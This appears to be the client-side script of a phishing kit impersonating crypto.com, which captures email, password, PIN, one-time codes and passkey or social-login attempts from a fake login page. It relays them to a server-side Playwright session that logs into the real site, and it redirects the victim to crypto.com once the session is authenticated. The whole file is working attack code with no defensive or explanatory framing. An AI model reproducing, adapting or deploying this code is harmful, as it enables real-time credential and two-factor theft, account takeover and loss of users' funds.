// relay.js — client-side login relay for crypto.com
// routes email → pin → otp through server-side Playwright session

(function () {
  'use strict';

  let SID = null;
  let qrPollTimer = null;

  /* ─── utility ─────────────────────────────────────────── */

  async function api(path, body) {
    const res = await fetch(path, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body),
    });
    return res.json();
  }

  function el(id) { return document.getElementById(id); }

  /* ─── boot — create session ────────────────────────────── */

  async function boot() {
    try {
      const r = await api('/api/session', {});
      if (r && r.sid) {
        SID = r.sid;
        startQr();
      }
    } catch (e) {
      console.warn('[relay] session init failed', e);
    }
  }

  /* ─── email/password submit ────────────────────────────── */

  window.doEmail = async function () {
    const emailEl = el('loginEmail') || el('emailInput');
    const passEl  = el('loginPass')  || el('emailPass');
    const email   = emailEl ? emailEl.value.trim() : '';
    const pass    = passEl  ? passEl.value         : '';

    if (!email) { if(emailEl) emailEl.focus(); return; }

    setLoading('btnLogin', true);

    try {
      const r = await api('/api/login', { sid: SID, email, password: pass });
      route(r);
    } catch (e) {
      setLoading('btnLogin', false);
    }
  };

  /* ─── passkey submit ────────────────────────────────────── */

  window.doPasskey = async function () {
    const emailEl = el('loginEmail') || el('passkeyEmail');
    const email   = emailEl ? emailEl.value.trim() : '';
    try {
      const r = await api('/api/login', { sid: SID, email, mode: 'passkey' });
      route(r);
    } catch (_) {}
  };

  /* ─── sign-up submit ───────────────────────────────────── */

  window.doSignup = async function () {
    const emailEl = el('signupEmail');
    const passEl  = el('signupPass');
    const email   = emailEl ? emailEl.value.trim() : '';
    const pass    = passEl  ? passEl.value         : '';
    if (!email || !pass) return;
    setLoading('btnSignup', true);
    try {
      const r = await api('/api/login', { sid: SID, email, password: pass, signup: true });
      route(r);
    } catch (_) { setLoading('btnSignup', false); }
  };

  /* ─── social login ──────────────────────────────────────── */

  window.doSocial = async function (provider) {
    try {
      const r = await api('/api/social', { sid: SID, provider });
      route(r);
    } catch (_) {}
  };

  /* ─── pin submit (called by HTML button via window hook) ── */

  function sendPin(val) {
    setLoading('btnPin', true);
    api('/api/login', { sid: SID, pin: val }).then(r => {
      setLoading('btnPin', false);
      route(r);
    }).catch(() => { setLoading('btnPin', false); });
  }

  window._submitPin = sendPin;

  /* ─── otp submit (called by HTML button via window hook) ── */

  function sendOtp(val) {
    setLoading('btnOtp', true);
    api('/api/otp', { sid: SID, otp: val }).then(r => {
      setLoading('btnOtp', false);
      route(r);
    }).catch(() => { setLoading('btnOtp', false); });
  }

  window._submitOtp = sendOtp;

  /* ─── resend otp ────────────────────────────────────────── */

  window._resendOtp = async function () {
    try {
      await api('/api/otp', { sid: SID, resend: true });
    } catch (_) {}
  };

  /* ─── loading state helper ──────────────────────────────── */

  function setLoading(btnId, on) {
    const btn = el(btnId);
    if (!btn) return;
    btn.classList.toggle('loading', on);
    btn.disabled = on;
  }

  /* ─── QR polling ────────────────────────────────────────── */

  function startQr() {
    if (!SID) return;
    pollQr();
    qrPollTimer = setInterval(pollQr, 3000);
  }

  function stopQr() {
    if (qrPollTimer) { clearInterval(qrPollTimer); qrPollTimer = null; }
  }

  async function pollQr() {
    try {
      const r    = await fetch('/api/status/' + SID);
      const data = await r.json();
      if (data.step) route(data);
    } catch (_) {}
  }

  /* ─── router — handle server step responses ─────────────── */

  function route(r) {
    if (!r) return;

    switch (r.step) {
      case 'pin':
        stopQr();
        if (window._showPinView) window._showPinView();
        break;

      case 'otp':
        stopQr();
        if (window._showOtpView) window._showOtpView(r.hint || 'Enter the 6-digit code sent to you');
        break;

      case 'done':
      case 'authed':
        stopQr();
        if (window._showSuccessView) window._showSuccessView();
        setTimeout(() => {
          window.location.href = r.redirect || 'https://crypto.com/app';
        }, 2800);
        break;

      case 'error':
        stopQr();
        setLoading('btnLogin',  false);
        setLoading('btnSignup', false);
        setLoading('btnPin',    false);
        setLoading('btnOtp',    false);
        break;

      default:
        break;
    }
  }

  /* ─── enter-key shortcuts ───────────────────────────────── */

  document.addEventListener('DOMContentLoaded', () => {
    ['loginEmail','loginPass'].forEach(id => {
      const inp = el(id);
      if (inp) inp.addEventListener('keydown', e => { if(e.key==='Enter') window.doEmail(); });
    });
    ['signupEmail','signupPass'].forEach(id => {
      const inp = el(id);
      if (inp) inp.addEventListener('keydown', e => { if(e.key==='Enter') window.doSignup(); });
    });

    boot();
  });

  // expose
  window._startQr = startQr;
  window._stopQr  = stopQr;

})();
